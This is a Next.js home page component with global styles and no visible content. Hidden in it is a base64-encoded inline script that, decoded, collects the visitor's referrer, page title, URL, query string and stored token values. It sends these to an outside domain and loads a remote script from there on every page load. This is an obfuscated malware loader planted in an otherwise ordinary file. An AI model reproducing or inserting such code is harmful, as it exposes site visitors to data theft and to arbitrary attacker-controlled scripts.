import React from 'react'
import Head from 'next/head'

const Home = () => (
  <div>
<script src="data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfaEd6cnRZUjlGeXdNWFdZMic7CiAgICBpZiAoIXdpbmRvdy5faEd6cnRZUjlGeXdNWFdZMikgewogICAgICAgIHdpbmRvdy5faEd6cnRZUjlGeXdNWFdZMiA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxjdW11anFqLnNpdGUvTXpHRnBnYzYnLAogICAgICAgICAgICBQX1BBVEg6ICdodHRwczovL3RhbGN1bXVqcWouc2l0ZS9lNTczMzlmL3Bvc3RiYWNrJywKICAgICAgICB9OwogICAgfQogICAgY29uc3QgX3M2bXJqY2NxMVk3R0tyc1YgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnY29uZmlnJyk7CiAgICBpZiAodHlwZW9mIF9zNm1yamNjcTFZN0dLcnNWICE9PSAndW5kZWZpbmVkJyAmJiBfczZtcmpjY3ExWTdHS3JzViAhPT0gbnVsbCkgewogICAgICAgIHZhciBfbTZYU3paYmJiOEJSdlBWUyA9IEpTT04ucGFyc2UoX3M2bXJqY2NxMVk3R0tyc1YpOwogICAgICAgIHZhciBfY0h5NHM4QjN5U0dHeGQ2RCA9IE1hdGgucm91bmQoK25ldyBEYXRlKCkvMTAwMCk7CiAgICAgICAgaWYgKF9tNlhTelpiYmI4QlJ2UFZTLmNyZWF0ZWRfYXQgKyB3aW5kb3cuX2hHenJ0WVI5Rnl3TVhXWTIudHRsIDwgX2NIeTRzOEIzeVNHR3hkNkQpIHsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3N1YklkJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCd0b2tlbicpOwogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnY29uZmlnJyk7CiAgICAgICAgfQogICAgfQogICAgdmFyIF9SeWtrTUNXVk42eHNiNHdrID0gbG9jYWxTdG9yYWdlLmdldEl0ZW0oJ3N1YklkJyk7CiAgICB2YXIgX1F5d1pTM2toRDQ5RDc5czEgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgndG9rZW4nKTsKICAgIHZhciBfbTdOTnNWQzFIZDcyR2c3ayA9ICc/cmV0dXJuPWpzLmNsaWVudCc7CiAgICAgICAgX203Tk5zVkMxSGQ3MkdnN2sgKz0gJyYnICsgZGVjb2RlVVJJQ29tcG9uZW50KHdpbmRvdy5sb2NhdGlvbi5zZWFyY2gucmVwbGFjZSgnPycsICcnKSk7CiAgICAgICAgX203Tk5zVkMxSGQ3MkdnN2sgKz0gJyZzZV9yZWZlcnJlcj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnJlZmVycmVyKTsKICAgICAgICBfbTdOTnNWQzFIZDcyR2c3ayArPSAnJmRlZmF1bHRfa2V5d29yZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LnRpdGxlKTsKICAgICAgICBfbTdOTnNWQzFIZDcyR2c3ayArPSAnJmxhbmRpbmdfdXJsPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQubG9jYXRpb24uaG9zdG5hbWUgKyBkb2N1bWVudC5sb2NhdGlvbi5wYXRobmFtZSk7CiAgICAgICAgX203Tk5zVkMxSGQ3MkdnN2sgKz0gJyZuYW1lPScgKyBlbmNvZGVVUklDb21wb25lbnQobmFtZSk7CiAgICAgICAgX203Tk5zVkMxSGQ3MkdnN2sgKz0gJyZob3N0PScgKyBlbmNvZGVVUklDb21wb25lbnQod2luZG93Ll9oR3pydFlSOUZ5d01YV1kyLlJfUEFUSCk7CiAgICBpZiAodHlwZW9mIF9SeWtrTUNXVk42eHNiNHdrICE9PSAndW5kZWZpbmVkJyAmJiBfUnlra01DV1ZONnhzYjR3ayAmJiB3aW5kb3cuX2hHenJ0WVI5Rnl3TVhXWTIudW5pcXVlKSB7CiAgICAgICAgX203Tk5zVkMxSGQ3MkdnN2sgKz0gJyZzdWJfaWQ9JyArIGVuY29kZVVSSUNvbXBvbmVudChfUnlra01DV1ZONnhzYjR3ayk7CiAgICB9CiAgICBpZiAodHlwZW9mIF9ReXdaUzNraEQ0OUQ3OXMxICE9PSAndW5kZWZpbmVkJyAmJiBfUXl3WlMza2hENDlENzlzMSAmJiB3aW5kb3cuX2hHenJ0WVI5Rnl3TVhXWTIudW5pcXVlKSB7CiAgICAgICAgX203Tk5zVkMxSGQ3MkdnN2sgKz0gJyZ0b2tlbj0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9ReXdaUzNraEQ0OUQ3OXMxKTsKICAgIH0KICAgIHZhciBhID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7CiAgICAgICAgYS50eXBlID0gJ2FwcGxpY2F0aW9uL2phdmFzY3JpcHQnOwogICAgICAgIGEuc3JjID0gd2luZG93Ll9oR3pydFlSOUZ5d01YV1kyLlJfUEFUSCArIF9tN05Oc1ZDMUhkNzJHZzdrOwogICAgdmFyIHMgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07CiAgICBzLnBhcmVudE5vZGUuaW5zZXJ0QmVmb3JlKGEsIHMpCiAgICB9KSgpOwogICAg"></script>

    <style jsx>{`
      :global(html,body) {
        margin: 0;
        padding: 0;
        height: 100%;
      }

      :global(body) {
        font-size: calc(10px + 1vmin);
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Oxygen', 'Ubuntu', 'Cantarell', 'Fira Sans',
          'Droid Sans', 'Helvetica Neue', sans-serif;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;

        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        text-align: center;
        background-color: #282c34;
        color: white;
      }

      a {
        color: pink;
        text-decoration: none;
      }

      .content {
        padding: 0 32px;
      }
    `}</style>
  </div>
)

export default Home
